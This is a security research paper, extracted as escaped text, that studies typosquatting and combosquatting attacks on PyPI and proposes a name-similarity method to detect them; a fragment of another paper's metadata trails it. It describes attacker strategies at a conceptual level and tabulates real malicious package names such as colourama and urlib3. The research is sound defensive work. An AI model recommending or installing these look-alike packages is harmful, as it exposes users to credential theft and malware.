PyPI\\nI. I NTRODUCTION\\nPython Package Index (PyPI) provides a comfortable and\\nwidely used way to distribute Python projects users. However,\\nthis ease of use comes at a cost: PyPI has been leveraged to\\nspread malware [1]. For example, the Slovak National Security\\nOf\\ufb01ce1 reported 10 cases where malicious code was embedded\\ninto the installation script to steal users\\u2019 data. Perica [2]\\nshowed that many packages in PyPI contain executables that\\nmay include malicious payload triggered by users.\\nLimited automated controls integrated into the PyPI pack-\\nage publishing system and a small number of administrators\\nprevents the security veri\\ufb01cation of every package. Hence,\\nattackers can repackage the others package code into a new\\npackage with a malicious payload, and trick users into in-\\nstalling it. Several studies demonstrated PyPI vulnerability to\\nthe squatting attacks.\\nTo demonstrate the ability to register typosquatting packages\\nTschacher [1] uploaded arti\\ufb01cial packages with the names\\nnearly identical to the legitimate packages, to the three dif-\\nferent software repositories (including PyPI), and received\\n45K downloads over several months. Stagg [3] crafted and\\nuploaded 12 packages that have names of the modules of\\nPython standard library (e.g., os, csv) and observed a\\nmassive number of downloads of these packages (>490K\\ndownloads per year). Hence, squatting package names could\\nbe an attractive way to introduce malicious packages in PyPI.\\nConsidering the ever-growing popularity of PyPI, there is\\na signi\\ufb01cant need for controls capable to automatically \\ufb01nd\\nmalicious packages hosted in PyPI and prevent attackers from\\n1https://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\\nuploading new malicious packages. Hence, in this paper, we\\nprovide the following contributions:\\n\\u2022 a study of the common attacks to craft malicious packages\\nand trick users into downloading them,\\n\\u2022 an approach for automatic identi\\ufb01cation of packages\\nlikely used in combosquatting and typosquatting attacks.\\nFollowing the motivating study of Stagg [3], we checked\\nwhether any PyPI packages have the same name as any of\\nthe 297 module names of the Python standard library.2 We\\nidenti\\ufb01ed 62 such packages. Our manual analysis of these\\npackages suggested that they are kept in PyPI mostly for\\nbackporting reasons.3\\nTable I shows that attackers apply different modi\\ufb01cations\\nto package names, however, these names remain similar to\\nthe original packages. Therefore, we use the Levenshtein\\ndistance [4] as the simplest and widely used technique to\\ncalculate the edit distance between package name strings. Our\\nempirical results suggest that 79 933 packages are safe to use,\\nand 67 005 packages require to be further investigated.\\nII. H OW PYPI WORKS\\nPyPI is a popular repository of Python applications or\\npackages: as of February 2020, it contains more than 216K\\npackages with the total number of downloads exceeding four\\nbillion times. PyPI is maintained by a group of developers\\ncalled Python Packaging Authority (PyP A for short). Figure 1\\nprovides an overview of different roles envisioned by PyPI:\\nEnd Users, Package Owners, PyPI Moderators (PyP A), and\\nPyPI Administrators (PyP A).\\nEnd Users provide the name of a package to a package\\nmanager tool, like pip5 to install the package from PyPI.\\nAlthough pip does everything automatically for installing a\\npackage, it neither requires user authentication nor performs\\nany validation of the package. Instead,pip merely looks for\\nthe package in PyPI by its name, identi\\ufb01es and resolves its\\ndependencies, downloads all the required components, and\\ninstalls them on the End User\\u2019s computer.\\n2We checked against all modules appeared in at least one of the existing\\nPython standard libraries: Python 2.6, 2.7, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7, and 3.8.\\n3The manual analysis of 62 packages available at https://github.com/\\nvuduclyunitn/wacco_2020\\n4Data collected from pypistats.com on Feb 15, 2020\\n5https://pip.pypa.io/en/stable/\\n509\\n2020 IEEE European Symposium on Security and Privacy Workshops (EuroS&PW)\\n\\u00a9 2020, Duc Ly Vu. Under license to IEEE.\\nDOI 10.1109/EuroSPW51379.2020.00074\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. Package Owners (400K)\\n End users\\nAdministrators\\nless than 10 people\\n30TB/day\\nNurse\\nModerators\\nUpload project\\nMaintain project Install project\\nBan project\\nRemove package\\nFig. 1: Roles and responsibilities in the PyPI ecosystem.4\\nPackage Owners can distribute code on PyPI using the tool\\ncalled setuptools6 that packs the original source code and\\ngenerates a local distribution that is either in a source7 or built8\\nformat. Package Owners register a package name on PyPI and\\npublish the distribution artifacts of the package. If Package\\nOwners have provided both distribution types,pip prefers to\\ninstall the built distribution \\ufb01rst. Publishing a package on PyPI\\nis restricted to Package Owers, who can later modify (e.g.,\\nupdate a new version) existing packages that they have access.\\nPyPI Administrators and Moderators have exclusive rights\\nto ban or revoke packages of Package Owners. For example, if\\na particular package is reported as malware, the Administrators\\nwill delete the package from PyPI and block the malicious de-\\nveloper. The Administrators can delete the corrupted package\\nand support the Package Owners in recovering their access if\\na package owner credentials are compromised or damaged.\\nAlthough this scheme proved to support high latency for\\nboth Package Owners and End Users, limited resources and\\nautomated controls integrated into the package uploading, and\\ndistribution process leave the room for attackers to use PyPI\\nfor spreading malicious software. PyPI especially becomes an\\nattractive target for attackers, considering the certain unbal-\\nance concerning the number of Package Owners and PyP A\\ndevelopers (40K to 1) and continuously growing popularity\\nof PyPI. In the next sections, we will give an overview of\\nthe common strategies that attackers use to craft malicious\\npackages and exploit the PyPI package distribution procedure\\nto deliver malicious packages to End Users (Section III).\\nIII. C RAFTING AND SHIPPING MALICIOUS P ACKAGES\\nIn the wild, attackers use mostly two ways to spread\\nmalicious code within the PyPI ecosystem:\\n\\u2022 steal the legitimate package owner\\u2019s credentials of an\\nexisting package, inject a malicious payload into it so\\nthat users in their normal activities can unintentionally\\ndownload it (e.g., install or update a package);\\n\\u2022 create a new package with built-in malicious payload and\\ntrick users into downloading it (e.g., by squatting the\\nname of a popular package).\\nStealing PyPI credentials. In the \\ufb01rst approach, attackers\\nexploit End Users\\u2019 trust in an already existing package. After\\n6https://github.com/pypa/setuptools\\n7https://packaging.python.org/glossary/#term-source-distribution-or-sdist\\n8https://packaging.python.org/glossary/#term-built-distribution\\nthe attacker obtained the Package Owner\\u2019s rights to perform\\nspeci\\ufb01c operations in the publishing process, they can upload\\ntheir crafted package as a new (malicious) version of a com-\\npromised package. The ssh-decoratepackage (Table I)\\nwas affected by such an attack when attackers injected a\\nmalicious functionality for sending users\\u2019 SSH credentials to a\\nremote server.9 Although this attack requires additional effort\\n(e.g., social engineering) to obtain the credentials of package\\nowners, a certain number of infections are still possible.\\nTricking users into downloading malicious packages.In\\nthe second approach, attackers create a new package that, by\\ndesign, features some malicious behavior. Attackers can craft\\nthe package from scratch or fork an existing PyPI package. In\\nthe latter case, the attackers injected a malicious dependency\\nby modifying thesetup.py installation script of the package so\\nthat the malicious dependency will be downloaded and silently\\ninstalled along with the benign package (e.g.,acqusition\\n(#11), urlib3 (#8) attacks in Table I). Then, they follow a\\nregular procedure to create an account in PyPI, register a new\\npackage name, and upload the malicious package.\\nTo increase the chance of getting more infections, attackers\\nregister package names that are similar to existing (usually\\npopular) packages by package typosquatting or package\\ncombosquatting([5],[6]) in which they split the package name\\ninto elements based on the \\\"hyphen\\\" character, and rearrange\\nthe elements, e.g., \\\"python-nmap\\\" into \\\"nmap-python\\\". Users\\nwho mistype or confuse the package name will install the\\nmalicious package instead of the legitimate one.\\nGiven a large number of package owners w.r.t. the number\\nof administrators, this likely to be (and so far has been)\\nundetected because several legitimate packages whose names\\nvery close to other legitimate packages. For example, there is a\\nPyPI package calledcpythonthat has the same name as the\\nGithub project \\u201ccpython\\u201d.10 The package, however, has a very\\nvague description and uses a different source code repository.\\nTable I shows several past combosquatting and typosquat-\\nting attacks in PyPI. Lutoma11 detected two malicious pack-\\nages; one substituted the \\u2018l\\u2019 character with the capital \\u2018I\\u2019 so\\nthat it is quite tricky to distinguish between jeIlyfish\\nand jellyfish. At the time of its detection, the package\\nhad been downloaded 119 times. Another malicious package\\nexploited the difference between the package naming practices\\nestablished in two python versions Python 2 and Python 3\\n(python3-dateutilvs. python-dateutil) to con-\\nfuse users when selecting the package of a particular Python\\nversion. These packages were used to steal users\\u2019 information\\nand send them to a remote server. Attackers prefer to delete\\ncharacters from the legitimate packages to generate squatting\\nnames. For example, the Slovak National Security identi\\ufb01ed\\nten PyPI packages12 (e.g., acqusition, urllib) that sent\\n9https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-\\ndiscovered-in-pypi-repository-b66b8a534a8\\n10\\u201ccpython\\u201d is a compiler or an interpreter, not a third-party package\\n11https://github.com/dateutil/dateutil/issues/984\\n12https://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\\n510\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. T ABLE I: Malicious packages in our sample. Levenshtein distanced\\n# Time Appear Malicious Package Legitimate package Names change d=1 d=2\\n1 2016-03-02 virtualnv virtualenv Delete \\u2018e\\u2019 \\u2713\\n2 2016-03-03 mumpy numpy Substitute \\u2018n\\u2019 by \\u2018m\\u2019 \\u2713\\n3 2017-05-01 crypt crypto Delete \\u2018o\\u2019 \\u2713\\n4 2017-06-02 django-server django-server-guardian-api Delete \\u201c-guardian-api\\u201d\\n5 2017-06-02 pwd pwdhash.py Delete \\u201chash.py\\u201d\\n6 2017-06-02 setuptool setuptools Delete \\u2018s\\u2019 \\u2713\\n7 2017-06-02 setup-tools setuptools Insert \\u2018-\\u2019 \\u2713\\n8 2017-06-02 telnet telnetsrvlib Delete \\u201csrvlib\\u201d\\n9 2017-06-02 urlib3 urllib3 Delete \\u2018l\\u2019 \\u2713\\n10 2017-06-02 urllib urllib3 Delete \\u20183\\u2019 \\u2713\\n11 2017-06-03 acqusition acquisition Delete \\u2018i\\u2019 \\u2713\\n12 2017-06-03 apidev-coop apidev-coop_cms Delete \\u201c_cms\\u201d\\n13 2017-06-04 bzip bz2\\ufb01le Substitute \\u201c2\\ufb01le\\u201d by \\u201cip\\u201d\\n14 2017-11-23 djanga django Substitute \\u2018a\\u2019 by \\u2018o\\u2019 \\u2713\\n15 2017-11-24 easyinstall easy_install Delete \\u2018_\\u2019 \\u2713\\n16 2017-12-05 colourama colorama Delete \\u2018u\\u2019 \\u2713\\n17 2018-04-25 openvc opencv-python Swap \\u2018c\\u2019 and \\u2018v\\u2019 & Delete \\u201c-python\\u201d\\n18 2018-05-02 mateplotlib matplotlib Insert \\u2018e\\u2019 \\u2713\\n19 2018-05-02 numipy numpy Insert \\u2018i\\u2019 \\u2713\\n20 2018-05-02 python-mysql MySQL-python Swap \\u201cpython\\u201d and \\u201cmysql\\u201d \\u2713\\n21 2018-05-03 libcurl pycurl Substitute \\u201cpy\\u201d by \\u201clib\\u201d\\n22 2018-05-03 libhtml5 html5lib Swap \\u201chtml5\\u201d and \\u201clib\\u201d\\n23 2018-05-03 pysprak pyspark Swap \\u2018a\\u2019 and \\u2018r\\u2019 \\u2713\\n24 2018-05-03 PyYMAL pyyaml Swap \\u2018a\\u2019 and \\u2018m\\u2019 \\u2713\\n25 2018-05-10 nmap-python python-nmap Swap \\u201cnmap\\u201d and \\u201cpython\\u201d \\u2713\\n26 2018-05-10 python-mongo pymongodb Delete \\u201cdb\\u201d & Substitute \\u201cpy\\u201d by \\u201cpython-\\u201d\\n27 2018-05-10 python-openssl openssl-python Swap \\u201copenssl\\u201d and \\u201cpython\\u201d \\u2713\\n28 2018-09-17 pytz3-dev pytz Insert \\u201c3-dev\\u201d\\n29 2018-10-29 python-sqlite pysqlite Substitute \\u201cpy\\u201d by \\u201cpython-\\u201d\\n30 2018-10-30 python-ftp pyftpdlib Delete \\u201cdlib\\u201d & Substitute \\u201cpy\\u201d by \\u201cpython-\\u201d\\n31 2018-10-30 python-mysqldb MySQL-python Swap \\u201cpython\\u201d and \\u201cmysql\\u201d & Insert \\u201cdb\\u201d\\n32 2018-10-30 smb pysmb Delete \\u201cpy\\u201d \\u2713\\n33 2018-10-31 pythonkafka kafka-python Swap \\u201ckafka\\u201d and \\u201cpython\\u201d & Delete \\u2018-\\u2019\\n34 2019-12-01 jeIly\\ufb01sh jelly\\ufb01sh Substitute \\u2018l\\u2019 by \\u2018I\\u2019 \\u2713\\n35 2019-12-01 python3-dateutil python-dateutil Insert \\u20183\\u2019 \\u2713\\n36 2018-04-25 ssh-decorate ssh-decorate Hijacked Package\\nsensitive information to a remote server, nine of the packages\\nwere created by deleting characters from original packages.\\nSeveral combosquatting packages were distributed by ex-\\nploiting the usage of common pre\\ufb01xes or suf\\ufb01xes within\\nPyPI packages (see the analysis in Section V), e.g., pytz\\ninto pytz3-dev making the malicious package look like\\nthe distribution of a Python 3 development version of the\\noriginal package. Similarly, attackers used a singular form\\nof a package name instead of a plural one ( setuptool\\ninstead of setuptools), add special characters (e.g.,\\nhyphens or underscores), somewhere in a package name\\n(setup-toolsinstead ofsetuptools, easy_install\\ninstead ofeasyinstall), or create a similar package name\\na commonly known tool or a module of the standard library\\n(e.g., pwd13). Attackers leveraged the difference in spellings\\nof UK and US languages: malicious packagecolourama, re-\\nsembling the benign packagecolorama, download a crypto\\nminer upon installation by victims.14\\nIV . TELLING MALICIOUS PACKAGES APA RT\\nWe start by describing our collection of the ground-truth\\npackages. They are the ones whose characteristics of a le-\\ngitimate package. Then we proceed to identify suspicious\\n13There exist similar Linux commands.\\n14https://medium.com/@bertusk/cryptocurrency-clipboard-hijacker-\\ndiscovered-in-pypi-repository-b66b8a534a8\\npackages whose names that are the same or similar to the\\nground-truth packages.\\nAssumptions: Our ground-truth packages consist of two\\ntrusted sources:\\n1) Modules of the Python standard library15 (e.g., os, csv,\\nre) that are bundled into Python distributions.\\n2) PyPI packages with known source code repositories.\\nSimilar to [3], we assume that a PyPI package should not\\nuse the name of a module of the Python standard library. If a\\npackage in PyPI has an exact or nearly identical name to one\\nof these modules, we mark such a package as suspicious.\\nWe assume that a PyPI package\\u2019s legitimacy could be\\nveri\\ufb01ed by checking its source code repository that provides\\nadditional metrics (e.g., number of stars, followers, and forks)\\noften used by developers to reason about the package repu-\\ntation and community support [7]. Considering the examples\\nof Table I, we observe that developers tend to use the same\\npackage name as the repository name in Github. Although\\nthere is no strict requirement on the name correspondence, we\\nbase on this observation to identify the list of packages with\\nknown code repositories as ground-truth:\\n\\u2022 PyPI packages whose names are the same as the reposi-\\ntory names in Github are not typosquatting packages,\\n15https://docs.python.org/3/library/\\n511\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. \\u2022 PyPI packages whose names are different than the repos-\\nitory names or do not have any reference to a Github\\nrepository, require additional veri\\ufb01cation (Section VI).\\nAlgorithm: To measure the similarity of package names, we\\ncalculate the Levenshtein distance [4] between each pair of\\npackages and check if the distance is less than or equal to a\\nthreshold heuristically. Based on the list of previous typosquat-\\nting package names in Table I, we de\\ufb01ne the threshold for the\\npackage name similarity to be equal to two as it allows us\\nto identify the majority of known attacks (21 out of 36) and\\nreduce the number of false positives.\\nFigure 2 summarizes the proposed idea for detection of\\nsquatting packages. Packages where source appears in a repos-\\nitory (e.g., Github) can be veri\\ufb01ed either by checking their\\nreputation (e.g., number of stars) or source code. We assume\\nthat the packages that do not have source code repositories\\nor share the same repository while having a different name\\nat the same time with another are suspicious. We note that it\\nis not required that a legitimate package name in PyPI is the\\nsame as the repository name in Github or other version control\\nsystems.\\nPyPI\\n\\u2022 urllib3\\n\\u2022 tensor\\ufb02ow\\n\\u2022 pandas\\n..\\nSelect apackage\\nDoes thepackage have\\nthe same nameas a module ofstandard libs?\\nDoes thepackage have\\nthe namesimilar to amodule ofstandard libs?\\nDoes thepackage\\nhave thesamerepository\\nname?\\nDoes thepackage\\nhave thenamesimilar to apackage\\nwith knownsource?\\nManualinspection\\nNo\\nNo Yes\\nYe s\\nYe s\\nFig. 2: Detecting Suspicious Squatting Packages.16\\nStep 1: Processing of modules of Python standard library\\nTo compose a list of module names of the Python standard\\nlibrary, we base on thestdlib-list17 package to collect\\nPython standard library module names of the Python standard\\nlibrary from nine different Python versions. Then, we scan the\\nwhole PyPI and report packages whose names are the same\\nas any module of Python standard library as suspicious.\\nStep 2: Processing of PyPI packages with known source\\ncode repositoriesFor those PyPI packages whose URLs lead\\nto Github repositories, we use the URLs to extract the source\\ncdoe repository names. After comparing the repository and\\npackage name, we classify packages that have the same name\\nas not created for a typosquatting attack and all other packages\\nas required to pass through additional veri\\ufb01cation.\\nStep 3: Identi\\ufb01cation of packages possibly created for\\nsquatting attacksWe look for packages whose names have\\n16To simplify the algorithm, unspeci\\ufb01ed paths all lead to the legitimate\\npackages which are not required inspection.\\n17https://pypi.org/project/stdlib-list/\\nT ABLE II: Descriptive statistics of package name lengths.\\ncount mean std min 25% 50% 75% max\\npackage 216 547 12.4 7.4 1 7 10 16 80\\nthe Levenshtein distance less or equal than two to the module\\nnames of Python standard library and the packages whose\\nthe same names as code repositories (Step 2). To capture\\nthe common pre\\ufb01x \\u201cpython\\u201d added during the combosquatting\\nattack, we preprocess package names by substituting \\u201cpython\\u201d\\nwith \\u2018*\\u2019. This transformation allows us to capture, e.g., attacks\\n#20, #25-27, #29-31, and #33 in Table I.\\nV. EMPIRICAL RESUL TS\\nDescriptive statistics:In total, we analyzed 216 548 pack-\\nages from PyPI as of February 20, 2020. On average, a\\npackage name has 12 characters, while lengths of names of\\n50% of packages are shorter or equal to ten characters. Table II\\nshows descriptive statistics of package name lengths in PyPI.\\nWe identi\\ufb01ed 165 878 packages have homepage URLs, and\\n197 packages provide code page URLs.18 The largest share of\\nPyPI packages use Github as a place to store their source\\ncode: 141 358 homepage URLs (85%) and 196 codepage\\nURLs (99%). Other packages host their source code on GitLab\\n(2792 homepage URLs and 10 codepage URLs), BitBucket\\n(4606 homepage URLs and three code page URLs), Google\\ncode (847 homepage URLs), and SourceForge (618 homepage\\nURLs). 3550 packages (13.3%) either do not provide codepage\\nURLs or use URLs on PyPI as their homepages.\\nWe noticed that 613 packages use https://github.com/pypa/\\nsampleproject as their homepage URLs. This case might hap-\\npen because package developers had used a template to create\\nPyPI packages, but did not update their homepage URLs to the\\ntemplate. Moreover, 12 266 other packages are sharing several\\nhomepage URLs. This might happen for both malicious and\\nbenign reasons. The typosquatting packagejeLlyfishused\\nthe homepage URL of the legitimate packagejellyfish\\nunchanged so it may look legitimate to End Users.\\nFigure 3 shows the distribution of the Levenshtein distances\\nbetween all packages names in PyPI. The distance distribution\\nhas a shape of a normal distribution with 4 225 244 (0.02%)\\npairs of packages that have distances between one and two.\\n54.8% of the pairs have a distance between 9 and 16. The\\nbiggest Levenstein distance between package names is 80.19\\nHence, the identi\\ufb01ed threshold of the Levenshtein distance\\n(d=2) could be seen as a good trade-off, since it allows us to\\nidentify the majority of known attacks and does not generate\\na signi\\ufb01cant number of alerts (d=4 increases the 51 times\\namount of alerts from 4.2 million to 215 million).\\nKnown attacks. We observe that the attacks in Table I\\ntargeted popular packages: seven Github repositories (25%)\\nof the attacked packages have more than 2356 stars, 14 repos-\\nitories (50%) have more than 972 stars, and 21 repositories\\n(75%) of the packages have more than 84 stars. Fifteen out of\\nthe 28 squatting attacks are identi\\ufb01ed by setting the distance\\n18We found seven packages whose URLs are broken and corrected them.\\n192to3 and aaaaaaaaaaaaaaaaaaa-aaaaaaaaa-aaaaaaasa-aa\\naaaaasa-aaaaasaa-aaaaaaasa-bbbbbbbbbbb\\n512\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. Fig. 3: Levenshtein distance distribution of package names.\\nFig. 4: #Packages whose name differ from standard modules.\\nthreshold of one. Increasing the threshold to two allows us to\\ncapture six additional attacks (21 out of 28).\\nLooking at other packages in PyPI.\\nModules of Python standard library: We found 62 pack-\\nages in PyPI that have the same names as modules of the\\nPython standard library. We further checked whether we found\\nthe packages published by Stagg [3]: while Stagg published\\n\\u2018empty\\u2019 packages that were removed from PyPI, we identi\\ufb01ed\\nseveral packages with non-empty sources. Particularly, 16 out\\nof 62 packages do not have any releases, and 12 packages\\nhave only one release. Hence, we con\\ufb01rm that these packages\\nare not the ones published by [3] and con\\ufb01rm our manually\\nanalysis.\\nFigure 4 shows the distance distribution between Python\\nstandard library module names and other packages\\u2019 names.\\nThere are 296 PyPI packages whose names have the distance\\nless than or equal to two from Python standard library module\\nnames, and therefore, suspicious.\\nPyPI packages with known sources:From those packages\\nthat use the Github to host their source code, 79 933 packages\\n(36.9%) have the same name for both Github repository\\nand package name in PyPI (i.e., safe packages). Names of\\n61 522 packages differ from the names of their source code\\nFig. 5: #Packages whose names differ from repository names.\\nrepositories, and therefore, these packages require additional\\nanalysis. In Figure 5, we identi\\ufb01ed approximately 65 000 PyPI\\npackages have the names similar to the packages with known\\nsources (they have a distance less than or equal two).\\nInteresting naming patterns. We noticed some patterns\\nbetween the package names and repository names:\\n\\u2022 16 070 (7.4%) package names include names of their\\ncode repositories or vice versa (e.g., the package\\n0-core-clienthas its repository name0-core),\\n\\u2022 several common pre\\ufb01xes and suf\\ufb01xes are added or re-\\nmoved from the repository names to create PyPI package\\nnames. Several common pre\\ufb01xes are \\u2018python-\\u2019 (2287),\\n\\u2018-python\\u2019 (1343), \\u2018.git\\u2019 (1324),\\nUnderstanding these naming patterns might potentially sup-\\nport predicting future combosquatting attacks of legitimate\\npackages as adding/deleting a suf\\ufb01x or pre\\ufb01x is one of the\\ncombosquatting strategies (See Section III).\\nVI. T HREA TS TOVALIDITY\\nMissing potential typosquatting packages.Our approach\\ncan be applied for detecting typosquatting candidates of pack-\\nages whose names are longer than 2 (the selected threshold).\\nHowever, as shown in Table II, 75% of packages in PyPI have\\nmore than seven characters in their names. Hence, our pro-\\nposed approach relies on the Levenshtein distance applicable\\nto most of the PyPI ecosystem packages. To capture packages\\nwith short names, we plan to use common name patterns (e.g.,\\nrepeated or swapped characters)([5],[8]).\\nFalse positivesThe proposed approach has generated false-\\npositive \\ufb01ndings. For example, a package name might differ\\nfrom its source code repository name for a good reason, e.g.,\\nthe developers could not register the repository name because\\nthe name has been reserved. We manually veri\\ufb01ed 62 packages\\n(the ones look the same to standard libraries) and identi\\ufb01ed\\nthe following reasons behind existing of these packages in\\nPyPI: backport to old Python versions (17), empty packages\\n(17), toy packages (2), legitimate deprecated packages with\\ndifferent functionality (26).\\nThe manual analysis allowed us to identify the following\\nideas to reduce the number of false positives by analyzing:\\n513\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. package info (e.g., author reputation, package popularity) and\\ncode features (e.g., suspicious API calls).\\nWe use source code repository as a trusted source.\\nThe legitimacy of a package depends on the equality of\\npackage and repository name. However, a repository name\\nis not necessarily unique across Github (e.g., stub42/pytz and\\nnewvem/pytz). An organization and a repository name identify\\na project in Github. Hence, attackers may create a repository\\nwith the same name but different organization identi\\ufb01ers as an\\nexisting repository in Github (or even a new repository) and\\npublish a corresponding package in PyPI. Our approach is not\\ncapable of identifying such an attack. However, this attack\\nrequires additional effort to trick the users into downloading\\npackages that come from an unknown source. To overcome\\nthis limitation, we plan to extend the proposed approach to\\nconsidering other reputation metrics (e.g., number of stars).\\nOn the other hand, one Github repository might be used to\\nstore code of several different PyPI packages. For example,\\na Github repository https://github.com/Azure/azure-sdk-for-\\npython organization corresponds to 140 packages in PyPI (e.g.,\\nazure, azure-ai-nspkg). In such a case, our approach\\nwould generate a false alert.\\nAlso, the referred repository does not need to contain code\\nthat bears any relation to the package. We plan to employ\\na code analysis to identify such a discrepancy (whether a\\nparticular code fragment in a package originates from its\\nsource code repository). This might be a good signal for\\ndetection of injected code added by attackers or backporting\\nchanges added by developers directly to the packages.\\nSome known attacks are not caught. Although the\\nproposed approach allows us to catch most of the known\\ntyposquatting attacks, some attacks in Table I still remained\\nunidenti\\ufb01ed. Additional ways of checking modi\\ufb01cations of\\npackage names might allow the detection of such attacks.\\nFor example, attacks #20, #22, #23, #24, #25, #27 are based\\non the permutation of the legitimate package names, while\\ntyposquatting package names in attacks #4, #5, #12, #8\\nwere created as a result of deletions of a part of legitimate\\npackage names. However, including such checks to enlarge the\\nsearch space for the possible typosquatting candidates might\\nsigni\\ufb01cantly increase the number of false positive alerts, and\\ntherefore, could not be used alone. Hence, we are planning to\\ninvestigate the common patterns of packaging names in future\\nwork and embed them into our approach.\\nVII. R ELA TED WORK\\nDuan et al. [9] extract various features of a package to\\nidentify its maliciousness. They rely on the prede\\ufb01ned list of\\npopular packages to \\ufb01nd suspicious packages. We propose a\\nmethod to automatically \\ufb01nd legitimate packages that can be\\nused for \\ufb01nding potential typosquatting attacks.\\nTschacher [1] presented a comprehensive analysis of ty-\\nposquatting attacks, including the systematic generation of\\ntyposquatting package names, the publication of forks of the\\noriginal packages in several open-source ecosystems. By doing\\nthis, they can measure the severity of such an attack by\\ncounting the number of successful installations. Our study\\ncomplements this work by providing an approach for obtaining\\na list of legitimate package names that can be used for\\nautomatic identi\\ufb01cation of typosquatting packages in PyPI.\\nTaylor et al. [8] proposed an approach to identify typosquat-\\nting candidates based on package name patterns, like repeated,\\nomitted, or swapped characters, common typos, swapped\\nwords, and Python version numbers. While the authors con-\\nsidered the most downloaded packages, we have analyzed all\\nthe packages with source code repository links.\\nVIII. C ONCLUSION AND FUTURE WORK\\nIn this paper, we have studied attackers strategies in crafting\\nmalicious packages and trick Python developers into down-\\nloading malicious packages whose names are similar to the\\nlegitimate packages, i.e., the combosquatting and typosquat-\\nting attacks in the Python Package Index ecosystem. We have\\nalso proposed an automatic approach for detecting packages\\naffected by the typosquatting attack. The empirical evaluation\\nof the proposed approach on the list of known squatting attacks\\nsuggests that the approach is promising to be used in future\\nresearch for automatic identi\\ufb01cation of malicious packages in\\nPyPI and has the potential for creating an automatic system\\nthat prevents squatting attacks in the PyPI ecosystem.\\nFor the future work, we plan to extend the approach to\\nemploy the code level checks of the identi\\ufb01ed packages so\\nthat it will be capable of automatically identifying injected\\nmalicious code snippets into Python packages. Additionally,\\nwe plan to explore the applicability of the approach to other\\nsoftware ecosystems, like NPM or Maven.\\nACKNOWLEDGMENTS\\nThis research has been partly funded by the EU under the\\nH2020 Programs H2020-EU.2.1.1-CyberSec4Europe (Grant\\nNo. 830929), the NeCS: European Network for Cyber Security\\n(Grant No. 675320) and the SP ART A project (Grant No.\\n830892).\\nREFERENCES\\n[1] N. P . Tschacher, \\u201cTyposquatting in programming language package man-\\nagers,\\u201d Bachelor\\u2019s Thesis, Universit\\u00e4t Hamburg, Fachbereich Informatik.\\n[2] A. Z. Robert Perica, \\u201cSuppy chain malware - detecting malware in pack-\\nage manager repositories,\\u201d https://blog.reversinglabs.com/blog/suppy-\\nchain-malware-detecting-malware-in-package-manager-repositories.\\n[3] S. Stagg, \\u201cBuilding a botnet on pypi,\\u201d https://hackernoon.com/building-\\na-botnet-on-pypi-be1ad280b8d6, 2017.\\n[4] V . I. Levenshtein, \\u201cBinary codes capable of correcting deletions, inser-\\ntions, and reversals,\\u201d inSoviet physics doklady, 1966.\\n[5] Y . Hu, H. Wang, R. He, L. Li, G. Tyson, I. Castro, Y . Guo, L. Wu, and\\nG. Xu, \\u201cMobile app squatting,\\u201d inProc. of WWW\\u20192020, 2020.\\n[6] P . Kintis, N. Miramirkhani, C. Lever, Y . Chen, R. Romero-G\\u00f3mez,\\nN. Pitropakis, N. Nikiforakis, and M. Antonakakis, \\u201cHiding in plain sight:\\nA longitudinal study of combosquatting abuse,\\u201d inProc. of CCS\\u201917.\\n[7] I. Pashchenko, D. L. Vu, and F. Massacci, \\u201cA qualitative study of depen-\\ndency management and its security implications,\\u201d inProc. of CCS\\u201920.\\n[8] M. Taylor, R. K. V aidya, D. Davidson, L. De Carli, and V . Rastogi,\\n\\u201cSpellbound: Defending against package typosquatting,\\u201darXiv preprint.\\n[9] R. Duan, O. Alrawi, R. P . Kasturi, R. Elder, B. Saltaformaggio, and\\nW . Lee, \\u201cMeasuring and preventing supply chain attacks on package\\nmanagers,\\u201darXiv preprint.\\n514\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:11:16 UTC from IEEE Xplore.  Restrictions apply. \"\n",
      "}\n",
      "score: 0.09314770204036235\n",
      "{\n",
      "  \"metadata\": {\n",
      "    \"/Meeting Starting Date\": \"27 Oct. 2024\",\n",
      "    \"/ModDate\": \"D:20241127093145-05'00'\",\n",
      "    \"/IEEE Article ID\": \"10764827\",\n",
      "    \"/CreationDate\": \"D:20240926225444Z\",\n",
      "    \"/IEEE Issue ID\": \"10764801\",\n",
      "    \"/Producer\": \"OpenPDF 1.0.0-SNAPSHOT; modified using iText\\u00ae Core 7.2.4 (AGPL version) \\u00a92000-2022 iText Group NV\",\n",
      "    \"/Subject\": \"2024 39th IEEE/ACM International Conference on Automated Software Engineering (ASE);2024; ; ; \",\n",
      "    \"/IEEE Publication ID\": \"10764795\",\n",
      "    \"/Title\": \"1+1&#x003E;2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection\",\n",
      "    \"/Meeting Ending Date\": \"1 Nov. 2024\"\n",
      "  },\n",
